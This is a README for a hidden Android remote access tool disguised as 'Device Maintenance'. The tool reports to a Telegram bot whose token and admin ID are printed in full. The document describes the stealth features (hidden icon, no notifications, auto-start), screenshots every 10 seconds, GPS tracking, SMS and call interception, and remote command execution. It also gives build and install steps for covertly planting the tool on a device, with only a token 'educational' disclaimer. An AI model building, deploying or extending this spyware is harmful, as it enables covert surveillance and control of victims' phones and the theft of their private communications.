# Device Maintenance - Remote Access Tool

## Overview
Hidden monitoring application that connects to Telegram bot for real-time device control and surveillance.

## Features

### Monitoring
- 📸 Screenshot capture (10 second intervals)
- 📍 GPS location tracking (60 second intervals)
- 📞 Call logging (all incoming/outgoing)
- 💬 SMS monitoring (read all messages)
- 📱 Device information collection
- 🔋 Battery & RAM monitoring

### Control
- 🔒 Lock device with password
- 📞 Initiate phone calls
- 💬 Send SMS messages
- 📳 Control vibration
- 🎥 Spy mode activation
- ⚡ Remote command execution

### Stealth
- 👻 Hidden from launcher
- 🔇 No notifications
- 🚀 Auto-start on boot
- 📡 Background monitoring
- 🔐 Encrypted communication

## Configuration

**Bot Token**: 8871130465:AAHCrNExzTd6OilIihx7f-Sv7t6Rbkr2RC4
**Admin ID**: 6905057456

Configuration is pre-set. No manual changes required.

## Build Instructions

### Prerequisites
- Flutter SDK (2.18+)
- Android SDK
- 5GB free space

### Build Steps

```bash
# 1. Get dependencies
flutter pub get

# 2. Build release APK
flutter build apk --release

# 3. Output location
# build/app/outputs/apk/release/app-release.apk
```

### Installation

1. Transfer APK to Android device
2. Enable "Unknown Sources" in settings
3. Install APK
4. Grant all permissions when prompted
5. App becomes invisible after installation

## How It Works

### Startup Flow
1. User installs APK
2. App hides from launcher
3. Connects to Telegram bot
4. Sends device registration message
5. Starts monitoring in background
6. Begins polling for commands

### Monitoring Flow
1. Screenshots captured every 10 seconds (if spy mode active)
2. Location sent every 60 seconds (if spy mode active)
3. Calls logged in real-time
4. SMS intercepted in real-time
5. All data sent to Telegram

### Command Flow
1. Admin sends command via Telegram bot
2. RAT polls for commands every 3 seconds
3. Executes command on device
4. Sends result back to bot

## Permissions Required

- Location (GPS)
- Camera (future use)
- Microphone (future use)
- Contacts (reading)
- Phone (calling)
- SMS (reading/sending)
- Storage (file access)
- Internet (Telegram communication)

User must accept all permissions for full functionality.

## Spy Mode

When `/spy` command is sent via bot:
1. Device selected from list
2. Bot sends `/spy_group GROUP_ID` to RAT
3. RAT activates live monitoring
4. Screenshots sent to private spy group every 10 seconds
5. Location updates sent every 60 seconds
6. All calls/SMS logged to group
7. Admin sees real-time device activity

## File Structure

```
RAT_CONFIGURED/
├── lib/
│   ├── main.dart                 # Entry point
│   ├── services/
│   │   ├── telegram_service.dart # Bot communication
│   │   └── spy_service.dart      # Monitoring logic
│   └── utils/
│       └── app_hider.dart        # Hide app icon
├── android/
│   └── app/src/main/
│       └── AndroidManifest.xml   # Permissions
├── pubspec.yaml                  # Dependencies
└── BUILD_INSTRUCTIONS.txt        # Build guide
```

## Troubleshooting

### App won't build
```bash
flutter clean
flutter pub get
flutter build apk --release
```

### APK too large
This is normal. Includes Dart runtime and all dependencies (~50MB).

### Not connecting to bot
- Check internet connection
- Verify bot token
- Check admin ID
- Restart app

### Permissions not working
- Reinstall app
- Accept all permissions when prompted
- Check Android version (requires 6.0+)

## Security Notes

This tool is for educational and testing purposes only.

- Use only with explicit permission
- Respect user privacy
- Follow local laws and regulations
- Remove if no longer needed

## Support

For issues, check:
1. Flutter version (flutter --version)
2. Android SDK installed (flutter doctor)
3. Internet connection on device
4. Telegram bot token is valid
5. Admin ID is correct

## License

Private use only. Distribution prohibited.

---

**Ready to build? Run: `flutter build apk --release`**

6767 🔥
